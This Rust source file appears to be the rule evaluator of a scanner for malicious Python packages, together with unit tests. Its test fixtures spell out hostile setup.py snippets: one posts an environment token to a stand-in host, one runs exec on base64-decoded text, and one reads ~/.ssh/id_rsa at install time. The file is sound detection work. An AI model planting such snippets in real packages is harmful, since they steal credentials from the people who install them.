//! The evaluator: one pass per rule over the package graph
//! (DECISIONS.md, ADR-009, ADR-010; EVALUATION.md §6 for the ablation modes).

use std::collections::BTreeSet;

use phylaxis_core::{
    AnalysisMode, Confidence, Evidence, ExecutionPhase, Finding, PackageGraph, PathStep,
    PathStepKind, ReachabilityKind, ReachabilityPath, RiskScore, RuleSpec, ScanOptions, Severity,
    TaintSink, TaintSinkKind, TaintSource, TaintSourceKind, Verdict,
};
use phylaxis_graph::reach::{
    ReachLimits, SourcePattern, control_paths, data_paths, find_sinks, find_sources,
};

use crate::catalogue::{RULES, SINK_PATTERNS, SOURCE_PATTERNS};
use crate::error::RulesError;

/// The one rule whose control target is a *read* rather than a sink call: RULES.md defines
/// PHX-INS-003 as "a definition containing a `SensitiveFile` read, reachable from an install
/// root". `RuleSpec` has no field for that, so the engine recognises the rule by id and
/// targets the definitions that contain a matching read. The kinds in its `sinks` field are
/// not consulted. Filed as an open request in DECISIONS.md.
const SENSITIVE_READ_RULE: &str = "PHX-INS-003";

/// PHX-INS-002 is Medium, and High when the callee is `exec`/`eval` (RULES.md).
const INSTALL_EXEC_RULE: &str = "PHX-INS-002";
const EVAL_LIKE: &[&str] = &["exec", "eval", "compile"];

/// Evaluates every catalogue rule under `opts.mode`, applies `opts.min_confidence`, and
/// returns findings in canonical order (rule order, then path order).
pub fn evaluate(pg: &PackageGraph, opts: &ScanOptions) -> Result<Vec<Finding>, RulesError> {
    let mut out = Vec::new();
    for rule in RULES {
        out.extend(evaluate_rule(pg, rule, opts.mode)?);
    }
    if let Some(min) = opts.min_confidence {
        out.retain(|f| f.confidence >= min);
    }
    Ok(out)
}

/// Evaluates one rule:
/// - collect sources matching `rule.sources` and sinks matching `rule.sinks` from the
///   catalogue patterns (`phylaxis_graph::reach::{find_sources, find_sinks}`);
/// - `Reachability { .. }`: `data_paths` for `Data` rules, `control_paths` from every
///   root of the rule's phase for `Control` rules;
/// - `FileCooccurrence` / `DefinitionCooccurrence`: `cooccurrence_paths` instead;
/// - wrap each path in `Evidence` with the phase of the sink's definition
///   (`pg.phases.phase_of`) and build the `Finding` via `Finding::new` with
///   `mode.phase_weighting()`.
///
/// Snippets are left empty: the package graph carries spans, not source text, and the
/// caller that holds the files (the CLI) is the one that can cut them.
pub fn evaluate_rule(
    pg: &PackageGraph,
    rule: &RuleSpec,
    mode: AnalysisMode,
) -> Result<Vec<Finding>, RulesError> {
    let targets = targets(pg, rule);
    let paths: Vec<(ReachabilityPath, &TaintSink)> = match mode {
        AnalysisMode::Reachability { .. } => match rule.reachability {
            ReachabilityKind::Data => {
                let sources = sources(pg, rule.sources);
                let mut out = Vec::new();
                // One `data_paths` call per sink keeps each path paired with the sink it
                // ends at, which is what the phase is read from.
                for sink in &targets {
                    for path in data_paths(
                        pg,
                        &sources,
                        std::slice::from_ref(sink),
                        &ReachLimits::default(),
                    ) {
                        out.push((path, sink));
                    }
                }
                // Canonical path order: by source location, then sink location.
                out.sort_by(|a, b| {
                    let key = |p: &ReachabilityPath| {
                        (
                            p.steps.first().map(|s| s.location.clone()),
                            p.steps.last().map(|s| s.location.clone()),
                        )
                    };
                    key(&a.0).cmp(&key(&b.0))
                });
                out
            }
            ReachabilityKind::Control => {
                let mut out = Vec::new();
                // One finding per target: the first root (in root order) that reaches it.
                let mut reached = BTreeSet::new();
                for root in pg
                    .phases
                    .roots
                    .iter()
                    .filter(|r| r.phase == rule.technique.typical_phase)
                {
                    for sink in &targets {
                        if reached.contains(&sink.node) {
                            continue;
                        }
                        let found = control_paths(
                            pg,
                            root,
                            std::slice::from_ref(sink),
                            &ReachLimits::default(),
                        );
                        if let Some(path) = found.into_iter().next() {
                            reached.insert(sink.node);
                            out.push((path, sink));
                        }
                    }
                }
                out.sort_by(|a, b| a.1.location.cmp(&b.1.location));
                out
            }
        },
        AnalysisMode::FileCooccurrence | AnalysisMode::DefinitionCooccurrence => {
            cooccurrence(pg, rule, mode, &targets)
        }
    };

    let mut findings = Vec::with_capacity(paths.len());
    for (path, sink) in paths {
        let phase = phase_of_definition(pg, sink);
        let severity = severity(rule, sink);
        let message = format!(
            "{}: {} reaches {}",
            rule.title,
            path.steps.first().map_or("?", |s| s.symbol.as_str()),
            sink.pattern
        );
        let evidence = Evidence {
            path,
            phase,
            snippets: Vec::new(),
        };
        findings.push(Finding::new(
            rule.rule_id(),
            rule.technique,
            severity,
            evidence,
            message,
            mode.phase_weighting(),
        )?);
    }
    Ok(findings)
}

/// The ablation's co-occurrence predicates (EVALUATION.md §6, configurations A and B):
/// for each (source, sink) pair in the same file (A) or with the same owning definition
/// (B), emit a synthetic two-step path `[Source, Sink]` with `Confidence::Resolved`.
/// No graph traversal happens: that is the point of the ablation.
pub fn cooccurrence_paths(
    pg: &PackageGraph,
    rule: &RuleSpec,
    mode: AnalysisMode,
) -> Vec<ReachabilityPath> {
    let targets = targets(pg, rule);
    cooccurrence(pg, rule, mode, &targets)
        .into_iter()
        .map(|(path, _)| path)
        .collect()
}

fn cooccurrence<'a>(
    pg: &PackageGraph,
    rule: &RuleSpec,
    mode: AnalysisMode,
    targets: &'a [TaintSink],
) -> Vec<(ReachabilityPath, &'a TaintSink)> {
    let sources = sources(pg, rule.sources);
    let mut out = Vec::new();
    for sink in targets {
        // Only the first co-occurring source per sink: the predicate is "some source of the
        // rule's kind is here", and one pair is the evidence for it.
        let partner = sources.iter().find(|source| match mode {
            AnalysisMode::FileCooccurrence => source.location.file == sink.location.file,
            _ => source_owner(pg, source) == sink_owner(pg, sink),
        });
        let Some(source) = partner else { continue };
        let path = ReachabilityPath {
            kind: rule.reachability,
            steps: vec![
                PathStep {
                    kind: PathStepKind::Source,
                    location: source.location.clone(),
                    symbol: source.pattern.to_string(),
                    detail: None,
                },
                PathStep {
                    kind: PathStepKind::Sink,
                    location: sink.location.clone(),
                    symbol: sink.pattern.to_string(),
                    detail: None,
                },
            ],
            confidence: Confidence::Resolved,
            obfuscated: source.kind == TaintSourceKind::DecodedLiteral,
            conditional: false,
        };
        out.push((path, sink));
    }
    out
}

/// Every occurrence of the rule's source kinds, in canonical order.
fn sources(pg: &PackageGraph, kinds: &[TaintSourceKind]) -> Vec<TaintSource> {
    let patterns: Vec<SourcePattern> = SOURCE_PATTERNS
        .iter()
        .filter(|p| kinds.contains(&p.kind))
        .copied()
        .collect();
    find_sources(pg, &patterns)
}

/// What the rule's paths end at: sink calls for every rule but PHX-INS-003, whose target
/// is the sensitive read itself, presented as a sink so the control search and the finding
/// constructor treat it like any other target.
fn targets(pg: &PackageGraph, rule: &RuleSpec) -> Vec<TaintSink> {
    if rule.id == SENSITIVE_READ_RULE {
        return sources(pg, &[TaintSourceKind::SensitiveFile])
            .into_iter()
            .filter_map(|read| {
                let owner = pg.owner_of_flow_node(read.node)?;
                Some(TaintSink {
                    // Not consulted downstream; see `SENSITIVE_READ_RULE`.
                    kind: TaintSinkKind::NetworkEgress,
                    pattern: read.pattern,
                    location: read.location,
                    node: read.node,
                    definition: pg.call_graph.node_of(owner)?,
                })
            })
            .collect();
    }
    let patterns: Vec<_> = SINK_PATTERNS
        .iter()
        .filter(|p| rule.sinks.contains(&p.kind))
        .copied()
        .collect();
    find_sinks(pg, &patterns)
}

fn phase_of_definition(pg: &PackageGraph, sink: &TaintSink) -> ExecutionPhase {
    pg.call_graph
        .graph
        .node_weight(sink.definition)
        .map_or(ExecutionPhase::Runtime, |n| pg.phases.phase_of(n.symbol))
}

fn severity(rule: &RuleSpec, sink: &TaintSink) -> Severity {
    if rule.id == INSTALL_EXEC_RULE && EVAL_LIKE.contains(&sink.pattern.as_str()) {
        return Severity::High;
    }
    rule.severity
}

/// The definition a source sits in. A phase-root source's node is a call-graph node, not a
/// data-flow node, so it is read from the call graph.
fn source_owner(pg: &PackageGraph, source: &TaintSource) -> Option<phylaxis_core::SymbolId> {
    if source.kind == TaintSourceKind::PhaseRoot {
        return pg
            .call_graph
            .graph
            .node_weight(source.node)
            .map(|n| n.symbol);
    }
    pg.owner_of_flow_node(source.node)
}

fn sink_owner(pg: &PackageGraph, sink: &TaintSink) -> Option<phylaxis_core::SymbolId> {
    pg.call_graph
        .graph
        .node_weight(sink.definition)
        .map(|n| n.symbol)
}

/// Package-level aggregate and verdict (ADR-010).
pub fn score_package(findings: &[Finding]) -> (RiskScore, Verdict) {
    let risk = RiskScore::aggregate(findings);
    (risk, Verdict::from(risk))
}

#[cfg(test)]
mod tests {
    use super::*;
    use phylaxis_core::{FileId, ProjectMeta, RuleId, SourceFile, SourceKind};

    fn graph(files: &[(&str, &str)]) -> PackageGraph {
        let mut sorted: Vec<_> = files.to_vec();
        sorted.sort_by(|a, b| a.0.cmp(b.0));
        let sources: Vec<SourceFile> = sorted
            .iter()
            .enumerate()
            .map(|(i, (p, s))| SourceFile {
                id: FileId(i as u32),
                rel_path: (*p).to_owned(),
                kind: SourceFile::classify(p).unwrap_or(SourceKind::Python),
                bytes: s.as_bytes().to_vec(),
            })
            .collect();
        let asts: Vec<_> = sources
            .iter()
            .map(|f| phylaxis_parse::parse_python(f).unwrap())
            .collect();
        phylaxis_graph::build_package_graph(
            &asts,
            &ProjectMeta {
                top_level_modules: vec!["pkg".into()],
                ..Default::default()
            },
        )
        .unwrap()
    }

    const EXFIL: &str =
        "import os, requests\nrequests.post('https://c.invalid/', data=os.environ['TOKEN'])\n";
    const DISJOINT: &str = "import os, requests\nt = os.environ['TOKEN']\nrequests.post('https://c.invalid/', data='static')\n";

    // The ablation contract in one place: A flags the disjoint file, D does not.
    #[test]
    fn cooccurrence_flags_disjoint_but_reachability_does_not() {
        let g = graph(&[("setup.py", DISJOINT)]);
        let a = evaluate(
            &g,
            &ScanOptions {
                mode: AnalysisMode::FileCooccurrence,
                ..Default::default()
            },
        )
        .unwrap();
        let d = evaluate(&g, &ScanOptions::default()).unwrap();
        assert!(
            a.iter().any(|f| f.rule.as_str() == "PHX-EXF-001"),
            "A: file co-occurrence fires"
        );
        assert!(
            !d.iter().any(|f| f.rule.as_str() == "PHX-EXF-001"),
            "D: no path, no finding"
        );
    }

    #[test]
    fn reachability_flags_real_exfiltration_at_install_phase() {
        let g = graph(&[("setup.py", EXFIL)]);
        let d = evaluate(&g, &ScanOptions::default()).unwrap();
        let f = d
            .iter()
            .find(|f| f.rule.as_str() == "PHX-EXF-001")
            .expect("EXF-001 fires");
        assert_eq!(f.phase, phylaxis_core::ExecutionPhase::Install);
        assert_eq!(f.score.value(), 1.0);
        assert!(f.evidence.path.is_well_formed());
        let (risk, verdict) = score_package(&d);
        assert_eq!(verdict, Verdict::Malicious);
        assert!(risk.value() >= 0.7);
    }

    // Configuration C: same findings as D, phase weight 1.0 (the runtime variant scores
    // higher under C than under D).
    #[test]
    fn mode_c_removes_phase_weighting_only() {
        let g = graph(&[(
            "pkg/a.py",
            &format!(
                "def f():\n{}",
                EXFIL
                    .lines()
                    .map(|l| format!("    {l}\n"))
                    .collect::<String>()
            ),
        )]);
        let c = evaluate(
            &g,
            &ScanOptions {
                mode: AnalysisMode::Reachability {
                    phase_weighting: false,
                },
                ..Default::default()
            },
        )
        .unwrap();
        let d = evaluate(&g, &ScanOptions::default()).unwrap();
        assert_eq!(c.len(), d.len());
        assert!(c[0].score > d[0].score);
        assert_eq!(c[0].evidence.path, d[0].evidence.path);
    }

    // min_confidence filters, never rescoring.
    #[test]
    fn min_confidence_filters_ambiguous_findings() {
        let src = "import os, requests\nclass S:\n    def send(self, v):\n        requests.post('https://c.invalid/', data=v)\ndef go(obj):\n    obj.send(os.environ['TOKEN'])\n";
        let g = graph(&[("pkg/a.py", src)]);
        let all = evaluate(&g, &ScanOptions::default()).unwrap();
        assert!(
            all.iter()
                .any(|f| f.confidence == phylaxis_core::Confidence::Ambiguous)
        );
        let strict = evaluate(
            &g,
            &ScanOptions {
                min_confidence: Some(phylaxis_core::Confidence::Resolved),
                ..Default::default()
            },
        )
        .unwrap();
        assert!(
            strict
                .iter()
                .all(|f| f.confidence == phylaxis_core::Confidence::Resolved)
        );
    }

    // An aliased decoder over a variable still fires OBF-001: the shape of the b64_exec
    // fixture, with `import base64 as b` on top.
    #[test]
    fn aliased_decoder_through_variable_fires_obf_001() {
        let g = graph(&[(
            "setup.py",
            "import base64 as b\n_BLOB = 'aW1wb3J0IG9z'\nexec(b.b64decode(_BLOB).decode('utf-8'))\n",
        )]);
        let d = evaluate(&g, &ScanOptions::default()).unwrap();
        let f = d
            .iter()
            .find(|f| f.rule.as_str() == "PHX-OBF-001")
            .expect("OBF-001 fires");
        assert!(f.evidence.path.obfuscated);
        assert_eq!(f.phase, phylaxis_core::ExecutionPhase::Install);
    }

    // INS-003 targets the sensitive read itself: a setup.py that reads ~/.ssh and sends
    // nothing still fires it, and one that reads a relative file does not.
    #[test]
    fn ins_003_fires_on_an_install_phase_sensitive_read_alone() {
        let read = graph(&[(
            "setup.py",
            "import os\nwith open(os.path.expanduser('~/.ssh/id_rsa')) as fh:\n    k = fh.read()\n",
        )]);
        let d = evaluate(&read, &ScanOptions::default()).unwrap();
        assert!(d.iter().any(|f| f.rule.as_str() == "PHX-INS-003"));

        let plain = graph(&[(
            "setup.py",
            "with open('README.md') as fh:\n    long_description = fh.read()\n",
        )]);
        let d = evaluate(&plain, &ScanOptions::default()).unwrap();
        assert!(!d.iter().any(|f| f.rule.as_str() == "PHX-INS-003"));
    }

    // INS-002 is Medium, and High when the callee is exec/eval.
    #[test]
    fn ins_002_is_high_for_exec_and_medium_for_subprocess() {
        let g = graph(&[(
            "setup.py",
            "import subprocess\nsubprocess.run(['git', 'describe'])\nexec('x = 1')\n",
        )]);
        let d = evaluate(&g, &ScanOptions::default()).unwrap();
        let ins: Vec<_> = d
            .iter()
            .filter(|f| f.rule.as_str() == "PHX-INS-002")
            .map(|f| f.severity)
            .collect();
        assert!(ins.contains(&phylaxis_core::Severity::High));
        assert!(ins.contains(&phylaxis_core::Severity::Medium));
    }

    #[test]
    fn findings_are_in_canonical_rule_order() {
        let g = graph(&[(
            "setup.py",
            "import os, base64, requests\nexec(base64.b64decode('aW1wb3J0IG9z'))\nrequests.post('https://c.invalid/', data=os.environ['T'])\n",
        )]);
        let d = evaluate(&g, &ScanOptions::default()).unwrap();
        let ids: Vec<&str> = d.iter().map(|f| f.rule.as_str()).collect();
        let mut sorted_by_catalogue = ids.clone();
        sorted_by_catalogue.sort_by_key(|id| RULES.iter().position(|r| r.id == *id));
        assert_eq!(ids, sorted_by_catalogue);
        assert!(ids.contains(&"PHX-OBF-001") && ids.contains(&"PHX-EXF-001"));
        assert!(RuleId::parse(ids[0]).is_ok());
    }
}
